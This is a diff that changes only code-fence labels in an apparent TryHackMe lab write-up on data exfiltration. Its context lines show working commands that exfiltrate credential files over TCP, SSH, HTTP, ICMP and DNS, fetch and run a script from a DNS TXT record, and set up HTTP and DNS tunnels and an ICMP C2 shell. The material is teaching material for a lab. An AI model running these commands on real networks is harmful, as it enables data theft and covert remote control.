@@ -88,7 +88,7 @@ Deploy the provided VM and connect to it via an SSH client by deploying the Atta
 Machine IP: MACHINE_IP  Username: thm  Password: tryhackme
 
 Connect to the VM via the SSH client
-```Connect to the VM via the SSH client 
+```bash
 root@AttackBox$ ssh thm@MACHINE_IP
 ```
 
@@ -212,7 +212,7 @@ Communication over TCP requires two machines, one victim and one attacker machin
 
 Listening on port TCP/8080 in the JumpBox
 
-```Listening on port TCP/8080 in the JumpBox 
+```bash
 thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
 Listening on [0.0.0.0] (family 0, port 8080)
 ```
@@ -225,7 +225,7 @@ Listening on [0.0.0.0] (family 0, port 8080)
 
 Connect to the victim from the JumpBox
 
-```Connect to the victim from the JumpBox 
+```bash
 thm@jump-box$ ssh thm@victim1.thm.com
 ```
 
@@ -235,7 +235,7 @@ thm@jump-box$ ssh thm@victim1.thm.com
 
 Connect to the victim from the AttackBox
 
-```Connect to the victim from the AttackBox 
+```bash
 root@AttackBox$ ssh thm@MACHINE_IP -p 2022
 ```
 
@@ -243,7 +243,7 @@ root@AttackBox$ ssh thm@MACHINE_IP -p 2022
 
    Checking the creds.txt file on the victim machine
  
-```Checking the creds.txt file on the victim machine 
+```bash
 thm@victim1:~$ cat task4/creds.txt
 admin:password
 Admin:123456
@@ -256,7 +256,7 @@ root:toor
 
 Exfiltrate Data over TCP Socket from the victim machine!
 
-```Exfiltrate Data over TCP Socket from the victim machine! 
+```bash
 thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
 0+1 records in
 0+1 records out
@@ -280,7 +280,7 @@ Once we hit enter, we should receive the encoded data in the /tmp/ directory.
 
 Checking the received data on the JumpBox 
 
-```Checking the received data on the JumpBox 
+```bash
 thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
 Listening on [0.0.0.0] (family 0, port 8080)
 Connection from 192.168.0.101 received!
@@ -295,7 +295,7 @@ thm@jump-box$ ls -l /tmp/
 
 Restoring the tar file
 
-```Restoring the tar file 
+```bash
 thm@jump-box$ cd /tmp/
 thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
 0+1 records in
@@ -315,7 +315,7 @@ thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.t
 
 Uncompressing the tar file
 
-```Uncompressing the tar file 
+```bash
 thm@jump-box$ tar xvf task4-creds.tar
 task4/ 
 task4/creds.txt
@@ -332,7 +332,7 @@ Now let's confirm that we have the same data from the victim machine.
 
 Confirming the received data
 
-```Confirming the received data 
+```bash
 thm@jump-box$ cat task4/creds.txt
 admin:password
 Admin:123456
@@ -373,7 +373,7 @@ Let's assume that we have gained access to sensitive data that must be transmitt
 
 The data that needs to be transferred
 
-```The data that needs to be transferred 
+```bash
 thm@victim1:~$ cat task5/creds.txt
 admin:password
 Admin:123456
@@ -386,7 +386,7 @@ root:toor
 
 Exfiltration data from the victim1 machine
 
-```Exfiltration data from the victim1 machine 
+```bash
 thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
 ```
 
@@ -402,7 +402,7 @@ If we check the attacker machine, we can see that we have successfully transmitt
 
 Checking the received data
 
-```Checking the received data 
+```bash
 thm@jump-box$ cd /tmp/task5/
 thm@jump-box:/tmp/task5$ cat creds.txt
 admin:password
@@ -447,7 +447,7 @@ Let's login to theweb.thm.com machine using thm:tryhackme credentials and inspec
 
 Inspecting the Apache log file
 
-```Inspecting the Apache log file 
+```bash
 thm@jump-box:~$ ssh thm@web.thm.com
 thm@web-thm:~$ sudo cat /var/log/apache2/access.log
 [sudo] password for thm:
@@ -494,7 +494,7 @@ Now from the **Jump** machine, connect to the victim1.thm.com machine via SSH to
 
 Connecting to Victim1 machine from Jump Box
 
-```Connecting to Victim1 machine from Jump Box 
+```bash
 thm@jump-box:~$ ssh thm@victim1.thm.com
 ```
 
@@ -502,7 +502,7 @@ You can also connect to it from AttackBox using port 2022 as follow,
 
 Connecting to Victim1 machine from AttackBox
 
-```Connecting to Victim1 machine from AttackBox 
+```bash
 thm@attacker$ ssh thm@MACHINE_IP -p 2022
 ```
 
@@ -510,7 +510,7 @@ The goal is to transfer the folder's content, stored in /home/thm/task6, to anot
 
 Checking the Secret folder!
 
-```Checking the Secret folder! 
+```bash
 thm@victim1:~$ ls -l
 total 12
 drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4
@@ -523,7 +523,7 @@ Now that we have our data, we will be using the curl command to send an HTTP POS
 
 Sending POST data via CURL
 
-```Sending POST data via CURL 
+```bash
 thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
 ```
 
@@ -533,7 +533,7 @@ Next, from the **victim1 or JumpBox** machine, let's log in to the webserver, we
 
 Checking the received data
 
-```Checking the received data 
+```bash
 thm@victim1:~$ ssh thm@web.thm.com 
 thm@web:~$ ls -l /tmp/
 total 4
@@ -549,14 +549,14 @@ Nice! We have received the data, but if you look closely at the http.bs64 file, 
 
 Fixing the http.bs64 file!
 
-```Fixing the http.bs64 file! 
+```bash
 thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
 ```
 
 Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!
 
 Restoring the Data
-```Restoring the Data 
+```bash
 thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
 tmp/task6/
 tmp/task6/creds.txt
@@ -588,7 +588,7 @@ For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/
 
 Neo-reGeorg Path on AttackBox
 
-```Neo-reGeorg Path on AttackBox 
+```bash
 root@AttackBox:/opt/Neo-reGeorg#
 ```
 
@@ -596,7 +596,7 @@ Next, we need to generate an encrypted client file to upload it to the victim we
 
 Generating encrypted Tunneling Clients with a selected password!
 
-```Generating encrypted Tunneling Clients with a selected password! 
+```bash
 root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              
 
           "$$$$$$''  'M$  '$$$@m
@@ -639,7 +639,7 @@ To upload the PHP file, use admin as the key to let you upload any files into th
 
 Creating an HTTP Tunnel
 
-```Creating an HTTP Tunnel 
+```bash
 root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
 ```
 
@@ -651,7 +651,7 @@ For example, if we want to access the app.thm.com, which has an internal IP addr
 
 Access the app.thm.com machine via the HTTP Tunneling
 
-```Access the app.thm.com machine via the HTTP Tunneling 
+```bash
 root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
 Welcome to APP Server!
 ```
@@ -702,7 +702,7 @@ To perform manual ICMP data exfiltration, we need to discuss the ping command a 
 
 Sending one ICMP packet using the PING Command
 
-```Sending one ICMP packet using the PING Command 
+```bash
 thm@AttackBox$ ping MACHINE_IP -c 1
 ```
 
@@ -722,7 +722,7 @@ Let's say that we need to exfiltrate the following credentials thm:tryhackme. Fi
 
 Using the xxd command to convert text to Hex
 
-```Using the xxd command to convert text to Hex 
+```bash
 root@AttackBox$ echo "thm:tryhackme" | xxd -p 
 74686d3a7472796861636b6d650a
 ```
@@ -733,7 +733,7 @@ root@AttackBox$ echo "thm:tryhackme" | xxd -p
 
 Send Hex using the ping command.
 
-```Send Hex using the ping command. 
+```bash
 root@AttackBox$ ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a
 ```
 
@@ -755,7 +755,7 @@ Now from the **AttackBox** , let's set up the Metasploit framework by selecting 
 
 Set the BPF_FILTER in MSF 
 
-```Set the BPF_FILTER in MSF 
+```bash
 msf5 > use auxiliary/server/icmp_exfil
 msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
 BPF_FILTER => icmp and not src ATTACKBOX_IP
@@ -767,7 +767,7 @@ BPF_FILTER => icmp and not src ATTACKBOX_IP
 
 Set the interface in MSF
 
-```Set the interface in MSF 
+```bash
 msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
 INTERFACE => eth0
 msf5 auxiliary(server/icmp_exfil) > run
@@ -786,7 +786,7 @@ First, we will send the BOF trigger from the ICMP machine so that the Metasploit
 
 Sending the Trigger Value from the Victim
 
-```Sending the Trigger Value from the Victim 
+```bash
 thm@jump-box$ ssh thm@icmp.thm.com
 thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
     
@@ -810,7 +810,7 @@ Let's start sending the required data and the end of the file trigger value from
 
 Sending the Data and the End of the File Trigger Value
 
-```Sending the Data and the End of the File Trigger Value 
+```bash
 thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
     
 Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
@@ -852,7 +852,7 @@ thm@icmp-host:~#
 
 Receiving Data in MSF
 
-```Receiving Data in MSF 
+```bash
 msf5 auxiliary(server/icmp_exfil) > run
     
 [*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
@@ -878,7 +878,7 @@ ICMP C2 Communication
 
 Run the icmpdoor command on the ICMP-Host Machine
 
-```Run the icmpdoor command on the ICMP-Host Machine 
+```bash
 thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
 ```
 
@@ -890,7 +890,7 @@ Next, log in to the JumpBox and execute the icmp-cnc binary to communicate with 
 
 The data that needs to be transferred
 
-```The data that needs to be transferred 
+```bash
 thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
 shell: hostname
 hostname
@@ -968,7 +968,7 @@ First, we need to edit the Yaml Netplan configuration file.
 
 Edit Netplan Configuration File
 
-```Edit Netplan Configuration File 
+```bash
 root@AttackBox:~# nano /etc/netplan/aws-vmimport-netplan.yaml
 ```
 
@@ -997,7 +997,7 @@ root@AttackBox:~# nano /etc/netplan/aws-vmimport-netplan.yaml
 
 Apply the Netplan Changes
 
-```Apply the Netplan Changes 
+```bash
 root@AttackBox:~# netplan apply
 ```
 
@@ -1009,7 +1009,7 @@ Once you have access to the Jump machine, you need to make sure that the DNS is 
 
 Testing the DNS configuration
 
-```Testing the DNS configuration 
+```bash
 thm@jump-box:~$ dig +short test.thm.com
 127.0.0.1
 thm@jump-box:~$ ping test.thm.com -c 1
@@ -1090,7 +1090,7 @@ The first thing to do is make the attacker machine ready to receive any DNS requ
 
 Connect to the Attacker machine via SSH Client from JumpBox
 
-```Connect to the Attacker machine via SSH Client from JumpBox 
+```bash
 thm@jump-box$ ssh thm@attacker.thm.com
 ```
 
@@ -1098,7 +1098,7 @@ Or from the AttackBox machine using the MACHINE_IP and port 2322 as follows,
 
 Connect to the Attacker machine via SSH Client from AttackBox
 
-```Connect to the Attacker machine via SSH Client from AttackBox 
+```bash
 root@AttackBox$ ssh thm@MACHINE_IP -p 2322
 ```
 
@@ -1106,7 +1106,7 @@ In order to receive any DNS request, we need to capture the network traffic for 
 
 Capturing DNS requests on the Attacker Machine
 
-```Capturing DNS requests on the Attacker Machine 
+```bash
 thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
 tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
@@ -1117,7 +1117,7 @@ Once the attacker machine is ready, we can move to the next step which is to con
 
 Connect to Victim 2 via SSH Client from JumpBox
 
-```Connect to Victim 2 via SSH Client from JumpBox 
+```bash
 thm@jump-box$ ssh thm@victim2.thm.com
 ```
 
@@ -1125,7 +1125,7 @@ thm@jump-box$ ssh thm@victim2.thm.com
 
 Connect to Victim 2 via SSH Client from AttackBox
 
-```Connect to Victim 2 via SSH Client from AttackBox 
+```bash
 root@AttackBox$ ssh thm@MACHINE_IP -p 2122
 ```
 
@@ -1135,7 +1135,7 @@ On the victim2 machine, there is a task9/credit.txt file with dummy data.
 
 Checking the content of the creds.txt file
 
-```Checking the content of the creds.txt file 
+```bash
 thm@victim2$ cat task9/credit.txt
 Name: THM-user
 Address: 1234 Internet, THM
@@ -1148,7 +1148,7 @@ Code: 1337
 
 Encoding the Content of the credit.txt File
 
-```Encoding the Content of the credit.txt File 
+```bash
 thm@victim2$ cat task9/credit.txt | base64
 TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
 MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
@@ -1158,7 +1158,7 @@ MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
 
 Splitting the content into multiple DNS requests
 
-```Splitting the content into multiple DNS requests 
+```bash
 thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' 
 TmFtZTogVEhNLXVzZX.att.tunnel.com
 IKQWRkcmVzczogMTIz.att.tunnel.com
@@ -1178,7 +1178,7 @@ Let's check the other way where we send a single DNS request, which we will be u
 
 Splitting the content into a single DNS request
 
-```Splitting the content into a single DNS request 
+```bash
 thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
 TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com
 ```
@@ -1191,7 +1191,7 @@ Next, from the victim2 machine, we send the base64 data as a subdomain name with
 
 Send the Encoded data via the dig command
 
-```Send the Encoded data via the dig command 
+```bash
 thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
 ```
 
@@ -1201,7 +1201,7 @@ thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*
 
 Receiving the Data Using tcpdump
 
-```Receiving the Data Using tcpdump 
+```bash
 thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
 tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 22:14:00.287440 IP (tos 0x0, ttl 64, id 60579, offset 0, flags [none], proto UDP (17), length 104)
@@ -1220,7 +1220,7 @@ tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 byt
 
 Cleaning and Restoring the Receiving Data
 
-```Cleaning and Restoring the Receiving Data 
+```bash
 thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
 Name: THM-user
 Address: 1234 Internet, THM
@@ -1247,7 +1247,7 @@ ping -c 1 test.thm.com
 
 Encode the Bash Script as Base64 Representation
 
-```Encode the Bash Script as Base64 Representation 
+```bash
 thm@victim2$ cat /tmp/script.sh | base64 
 IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=
 ```
@@ -1260,7 +1260,7 @@ Once we added it, let's confirm that we successfully created the script's DNS re
 
 Confirm the TXT record is Added Successfully
 
-```Confirm the TXT record is Added Successfully 
+```bash
 thm@victim2$ dig +short -t TXT script.tunnel.com
 ```
 
@@ -1268,7 +1268,7 @@ We used the dig command to check the TXT record of our DNS record that we added 
 
 Execute the Bash Script!
 
-```Execute the Bash Script! 
+```bash
 thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
 ```
 
@@ -1324,7 +1324,7 @@ We will be using the [iodine ](https://github.com/yarrick/iodine)tool for creati
 
 Running iodined Server
 
-```Running iodined Server 
+```bash
 thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                     
 Opened dns0
 Setting IP of dns0 to 10.1.1.1
@@ -1348,7 +1348,7 @@ On the JumpBox machine, we need to connect to the server-side application. To do
 
 Victim Connects to the Server
 
-```Victim Connects to the Server 
+```bash
 thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com                                                                                                           
 Opened dns0                                                                                                                                                     
 Opened IPv4 UDP socket                                                                                                                                          
@@ -1373,7 +1373,7 @@ Note that all communication over the network 10.1.1.1/24 will be over the DNS. W
 
 SSH over DNS
 
-```SSH over DNS 
+```bash
 root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
 ```
 
@@ -1383,7 +1383,7 @@ root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
 
 Use SSH Connection as a Proxy
 
-```Use SSH Connection as a Proxy 
+```bash
 root@attacker$ proxychains curl http://192.168.0.100/demo.php
 root@attacker$ #OR
 root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
